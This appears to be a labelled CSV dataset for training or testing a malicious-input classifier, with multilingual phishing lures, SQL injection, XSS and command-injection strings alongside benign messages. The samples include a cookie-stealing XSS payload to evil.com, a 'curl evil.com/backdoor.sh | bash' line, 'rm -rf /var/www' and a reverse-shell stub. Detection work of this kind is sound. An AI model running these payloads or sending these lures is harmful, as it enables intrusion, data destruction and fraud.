text,label
Your parcel could not be delivered. Pay a small fee to reschedule: http://urgent-verify-now.co,PHISHING
"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://urgent-verify-now.co",PHISHING
"Can you help me schedule a meeting for next Tuesday at 3 PM? உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",BENIGN
"1'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",SQL_INJECTION
<SCRIPT>ALERT('XSS')</SCRIPT>,XSS
"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://account-alert-service.xyz",PHISHING
You have been selected for a cashback offer. Enter your UPI PIN to claim: http://parcel-track-pay.com,PHISHING
నేను రేపు ఆఫీసుకు 10 గంటలకు వస్తాను. The invoice for last month has been generated and sent to accounting.,BENIGN
"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://parcel-track-pay.com",PHISHING
Your bank account has been suspended. Click here immediately to verify: http://fraud-verify.com,PHISHING
Your OTP has expired. Re-enter your card details to continue: http://parcel-track-pay.com,PHISHING
"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://urgent-verify-now.co",PHISHING
Final notice: pay your pending electricity bill within 2 hours: http://prize-claim24.com,PHISHING
select * from users where id = %271%27 or %271%27=%271%27,SQL_INJECTION
"Congratulations! You have won a lottery of $10,000. Claim now at http://secure-bank-update.net",PHISHING
You have been selected for a cashback offer. Enter your UPI PIN to claim: http://fraud-verify.com,PHISHING
"""><script>document.location='http://evil.com'</script>",XSS
"Congratulations! You have won a lottery of $10,000. Claim now at http://account-alert-service.xyz",PHISHING
127.0.0.1;/**/ls/**/-la,COMMAND_INJECTION
' or 1=1#,SQL_INJECTION
"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://secure-bank-update.net",PHISHING
मुझे अपने खाते की जानकारी अपडेट करनी है।,BENIGN
"; python3 -c 'import os;os.system(""id"")'",COMMAND_INJECTION
Your bank account has been suspended. Click here immediately to verify: http://parcel-track-pay.com,PHISHING
Final notice: pay your pending electricity bill within 2 hours: http://urgent-verify-now.co,PHISHING
మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://fraud-verify.com,PHISHING
<IMG SRC=X ONERROR=THIS.SRC='HTTP://EVIL.COM/STEAL?C='+DOCUMENT.COOKIE>,XSS
1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0,SQL_INJECTION
"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://prize-claim24.com",PHISHING
Final notice: pay your pending electricity bill within 2 hours: http://kyc-refresh.info,PHISHING
<div onmouseover=alert('xss')>hover</div>,XSS
<a/**/href=javascript:alert(1)>click</a>,XSS
आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://secure-bank-update.net,PHISHING
test.txt && rm -rf /var/www,COMMAND_INJECTION
`WHOAMI`,COMMAND_INJECTION
I would like to update my shipping address for future orders. நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும்.,BENIGN
; chmod 777 /etc/shadow,COMMAND_INJECTION
உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://prize-claim24.com,PHISHING
<IMG SRC=X ONERROR=ALERT(1)>,XSS
"உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",BENIGN
"Thank you for your purchase, your order will arrive in 3 days. The invoice for last month has been generated and sent to accounting.",BENIGN
Your OTP has expired. Re-enter your card details to continue: http://urgent-verify-now.co,PHISHING
"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://parcel-track-pay.com",PHISHING
Security alert: unusual login detected. Verify your identity here: http://kyc-refresh.info,PHISHING
|| curl -s http://evil.com/backdoor.sh | bash,COMMAND_INJECTION
Final notice: pay your pending electricity bill within 2 hours: http://parcel-track-pay.com,PHISHING
select * from users where id = '1' or '1'='1',SQL_INJECTION
"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://parcel-track-pay.com",PHISHING
javascript:alert(%27hacked%27),XSS
"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://account-alert-service.xyz",PHISHING
<INPUT ONFOCUS=ALERT(1) AUTOFOCUS>,XSS
"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://secure-bank-update.net",PHISHING
"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://kyc-refresh.info",PHISHING
<body onload=alert('xss')>,XSS
URGENT: Your account will be locked in 24 hours. Update your password now: http://fraud-verify.com,PHISHING
"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://secure-bank-update.net",PHISHING
; /BIN/BASH -C 'REVERSE_SHELL',COMMAND_INJECTION
"The new product update includes several performance improvements. మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు.",BENIGN
எனது கடவுச்சொல்லை மாற்ற உதவுங்கள். My flight got delayed by two hours due to weather.,BENIGN
